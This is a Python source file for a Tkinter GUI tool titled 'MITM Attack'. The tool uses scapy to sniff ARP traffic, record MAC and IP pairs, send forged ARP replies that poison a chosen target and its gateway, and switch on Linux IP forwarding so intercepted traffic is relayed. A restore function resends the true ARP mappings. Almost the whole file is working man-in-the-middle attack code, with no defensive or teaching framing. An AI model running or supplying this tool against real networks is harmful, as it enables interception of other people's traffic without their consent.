#!/usr/bin/env python3

from pathlib import Path
from scapy.all import *
from scapy.modules import *
from scapy import *
import scapy.all as scapy
from sys import platform
import time
from tkinter import *

def main():
    ROOTPATH = Path(__file__).parent.parent
    ASSETPATH = f"{ROOTPATH}/assets"
    BLUE = "#1E2B33"
    ORANGE = "#F87D51"
    FONT = "aerial", 10, "bold"

    # ------------------------------------ FUNCTIONS ------------------------------------#
    #Sniffing all broadcast packets
    def arp_monitor_callback(pkt):
        pending_packets = []
        if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at
            pending_packets.append(pkt)
            wrpcap(f'{ROOTPATH}/mitm_attack/arp_monitor.pcap', pending_packets, append=True)
            return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")

    def monitor_arp():
        def do_sniff():
            num_packets = int(num_packets_entry.get())
            sniff(prn=arp_monitor_callback, filter="arp", store=0, count=num_packets)
            sniff_window.destroy()

        sniff_window = Toplevel(window)
        sniff_window.geometry("750x270")
        sniff_window.title("Monitor ARP Packets")
        sniff_window.config(padx=50, pady=50, bg=BLUE)

        num_packets_label = Label(sniff_window, text="How many packets would you like to sniff?:", bg=BLUE, fg=ORANGE, font=FONT)
        num_packets_label.grid(column=0, row=2)

        num_packets_entry = Entry(sniff_window, bg=BLUE, fg=ORANGE, font=FONT)
        num_packets_entry.grid(column=1, row=2, sticky="EW")
        num_packets_entry.insert(0, "")

        sniff_button = Button(sniff_window, text="Start Sniffing", command=do_sniff, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
        sniff_button.grid(column=1, row=3, columnspan=2, sticky="EW")


    #Extracting the MAC and IP addresses from the sniffed packets
    def read_bytes_from_pcap():
        packets = rdpcap('mitm_attack/arp_monitor.pcap')
        packet_dict = {}
        packet_dict = {packet[ARP].hwsrc: [packet[ARP].hwdst, packet[ARP].psrc, packet[ARP].pdst] for packet in packets}
        return packet_dict
        
    def toggle_IP_forward():
        if platform == 'linux' or platform == 'linux2':            
            path = '/proc/sys/net/ipv4/ip_forward'
            with open(path, "rb") as file:
                    if file.read() == b'1':
                        ip_forwarding_label2.config(text="Off")
                        ip_forward_button.config(text="Turn On Forwarding")
                        with open(path, "wb") as file:
                            file.write(b'0')
                    else:
                        ip_forwarding_label2.config(text="On")
                        ip_forward_button.config(text="Turn Off Forwarding")
                        with open(path, "wb") as file:
                            file.write(b'1')
        elif platform == 'darwin':
            print('MacOS not supported yet.')
        elif platform == 'win32':
            print('Enable IP forwarding with "run" regedit: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\Services\Tcpip\Parameters\EnableRouter')


    def view_working_pcap():
        pcap_window = Toplevel(window)
        pcap_window.geometry("750x270")
        pcap_window.title("View Working PCAP")
        pcap_window.config(padx=50, pady=50, bg=BLUE)
        
        pcap_listbox = Listbox(pcap_window, bg=BLUE, fg=ORANGE, font=FONT)
        pcap_listbox.pack(expand=True, fill=BOTH)

        packets = read_bytes_from_pcap()
        for k in packets.keys():
            pcap_listbox.insert(-1, f'MAC: {k} | Src.IP: {packets[k][1]}')



    def start_spoof():
        def get_mac_of_target(target_ip, packet_dict):
            for k in packet_dict.keys():
                if packet_dict[k][1] == target_ip:
                    return k

        def spoof():
            amount_to_run = int(spoof_time_entry.get())
            target_ip = spoof_target_ip_entry.get()
            gateway_ip = spoof_gateway_ip_entry.get()
            packet_dict = read_bytes_from_pcap()
            target1_mac = get_mac_of_target(target_ip, packet_dict)
            gateway_mac = get_mac_of_target(gateway_ip, packet_dict)

            if target1_mac == None or gateway_mac == None:
                print('Target IP or Gateway IP not found in ARP packets. Please try again.')
                spoof_window.destroy()
                return
            time_intervals = int((amount_to_run / 60) * 6)
            for _ in range(0, time_intervals):
                scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac))
                scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))
                time.sleep(10)
            print('ARP spoofing complete. ARP packets saved to mitm_attack/arp_spoof.pcap')
            spoof_window.destroy()

        spoof_window = Toplevel(window)
        spoof_window.geometry("650x300")
        spoof_window.title("Spoof ARP Packets")
        spoof_window.config(padx=50, pady=50, bg=BLUE)

        spoof_time_label = Label(spoof_window,text="How many seconds do you want to spoof for?", bg=BLUE, fg=ORANGE, font=FONT)
        spoof_time_label.grid(column=0, row=1)

        spoof_target_ip_interface_label = Label(spoof_window,text="Target IP Address:", bg=BLUE, fg=ORANGE, font=FONT)
        spoof_target_ip_interface_label.grid(column=0, row=2)

        spoof_gateway_ip_interface_label = Label(spoof_window,text="Gateway IP Address:", bg=BLUE, fg=ORANGE, font=FONT)
        spoof_gateway_ip_interface_label.grid(column=0, row=3)

        spoof_time_entry = Entry(spoof_window, bg=BLUE, fg=ORANGE, font=FONT)
        spoof_time_entry.grid(column=1, row=1, sticky="EW")

        spoof_target_ip_entry = Entry(spoof_window, bg=BLUE, fg=ORANGE, font=FONT)
        spoof_target_ip_entry.grid(column=1, row=2, sticky="EW")

        spoof_gateway_ip_entry = Entry(spoof_window, bg=BLUE, fg=ORANGE, font=FONT)
        spoof_gateway_ip_entry.grid(column=1, row=3, sticky="EW")

        spoof_button = Button(spoof_window, text="Start Spoofing", command=spoof, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
        spoof_button.grid(column=0, row=4, columnspan=2, sticky="EW")


    def fix_arp():
        def get_mac_of_target_fix(target_ip, packet_dict):
            for k in packet_dict.keys():
                if packet_dict[k][1] == target_ip:
                    return k

        def send_fix():
            target_ip = fix_target_ip_entry.get()
            gateway_ip = fix_gateway_ip_entry.get()
            for _ in range(16):
                packet_dict = read_bytes_from_pcap()
                target1_mac = get_mac_of_target_fix(target_ip, packet_dict)
                gateway_mac = get_mac_of_target_fix(gateway_ip, packet_dict)
                scapy.send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target1_mac, hwsrc=gateway_mac))
                scapy.send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target1_mac))
            fix_window.destroy()

        fix_window = Toplevel(window)
        fix_window.geometry("650x300")
        fix_window.title("Fix ARP Packets")
        fix_window.config(padx=50, pady=50, bg=BLUE)

        fix_target_ip_interface_label = Label(fix_window,text="Target IP Address:", bg=BLUE, fg=ORANGE, font=FONT)
        fix_target_ip_interface_label.grid(column=0, row=1)

        fix_gateway_ip_interface_label = Label(fix_window,text="Gateway IP Address:", bg=BLUE, fg=ORANGE, font=FONT)
        fix_gateway_ip_interface_label.grid(column=0, row=2)

        fix_target_ip_entry = Entry(fix_window, bg=BLUE, fg=ORANGE, font=FONT)
        fix_target_ip_entry.grid(column=1, row=1, sticky="EW")

        fix_gateway_ip_entry = Entry(fix_window, bg=BLUE, fg=ORANGE, font=FONT)
        fix_gateway_ip_entry.grid(column=1, row=2, sticky="EW")

        fix_button = Button(fix_window, text="Fix ARP Packets", command=send_fix, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
        fix_button.grid(column=0, row=3, columnspan=2, sticky="EW")


    # ------------------------------------ UI ------------------------------------#
    window = Tk()
    window.title("MITM Attack")
    window.config(padx=50, pady=50, bg=BLUE)


    canvas = Canvas(width=318, height=200, bg=BLUE, highlightthickness=0)
    kapow_img = PhotoImage(file=f"{ASSETPATH}/mitm.png")
    canvas.create_image(150, 150, image=kapow_img)
    canvas.grid(column=0, row=0, columnspan=2)


    # ------------------------------------ LABELS ------------------------------------#
    monitor_arp_label = Label(text="Monitor ARP", bg=BLUE, fg=ORANGE, font=FONT)
    monitor_arp_label.grid(column=0, row=2)

    spoof_arp_label = Label(text="Spoof ARP Packets", bg=BLUE, fg=ORANGE, font=FONT)
    spoof_arp_label.grid(column=0, row=3)

    view_pcap_label = Label(text="View PCAP", bg=BLUE, fg=ORANGE, font=FONT)
    view_pcap_label.grid(column=0, row=4)

    ip_forwarding_label = Label(text="Toggle Forward IP", bg=BLUE, fg=ORANGE, font=FONT)
    ip_forwarding_label.grid(column=0, row=5)

    ip_forwarding_label2 = Label(text="Off", bg=BLUE, fg=ORANGE, font=FONT)
    ip_forwarding_label2.grid(column=1, row=5)

    fix_arp_label = Label(text="Fix ARP Spoofing", bg=BLUE, fg=ORANGE, font=FONT)
    fix_arp_label.grid(column=0, row=6)

    # ------------------------------------ BUTTONS ------------------------------------#
    monitor_arp_button = Button(text="Begin Monitoring", command=monitor_arp, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
    monitor_arp_button.grid(column=1, row=2, columnspan=2, sticky="EW")

    spoof_arp_button = Button(text="Start Spoofing", command=start_spoof, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
    spoof_arp_button.grid(column=1, row=3, columnspan=2, sticky="EW")

    view_pcap_button = Button(text="View PCAP", command=view_working_pcap, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
    view_pcap_button.grid(column=1, row=4, columnspan=2, sticky="EW")

    ip_forward_button = Button(text="Turn On Forwarding", command=toggle_IP_forward, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
    ip_forward_button.grid(column=1, row=5, columnspan=2, sticky="EW")

    fix_arp_button = Button(text="Reset ARP Addresses", command=fix_arp, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
    fix_arp_button.grid(column=1, row=6, columnspan=2, sticky="EW")

    exit_button = Button(text="Bye!", command=window.destroy, bg=BLUE, fg=ORANGE, font=FONT, highlightthickness=0)
    exit_button.grid(column=1, row=7, columnspan=2, sticky="EW")



    window.mainloop()
